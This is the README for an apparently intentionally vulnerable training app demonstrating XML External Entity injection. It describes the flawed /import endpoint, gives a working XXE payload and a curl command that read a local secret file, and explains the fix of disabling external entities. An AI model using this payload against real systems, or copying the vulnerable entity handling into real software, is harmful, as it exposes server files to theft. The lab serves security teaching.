# 08 — XML External Entity Injection (XXE)

Port: `3008`

Note: this app uses a small hand-rolled entity resolver (not a full XML
parser) so the demo has no native dependencies. It reproduces the same
vulnerable pattern real XML parsers exhibit when external entity resolution
isn't disabled.

## Vulnerable endpoint

- `POST /import` (Content-Type: `application/xml`) — resolves
  `<!ENTITY name SYSTEM "file://...">` declarations by reading the given
  file from disk and substituting it wherever `&name;` appears, then
  reflects the result back in the response.

## Example payload

`payload.xml` in this folder:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file://./secret.txt"> ]>
<note>&xxe;</note>
```

```bash
cd apps/08-xxe
curl -X POST http://localhost:3008/import -H "Content-Type: application/xml" --data-binary @payload.xml
```

The response's `note` field contains the contents of `secret.txt`.

## What the fix would look like

Disable DTD/external-entity processing in the XML parser (most real parsers
have a "disallow-doctype-decl" / "external entities off" setting), or use a
parser that doesn't support DTDs at all for untrusted input.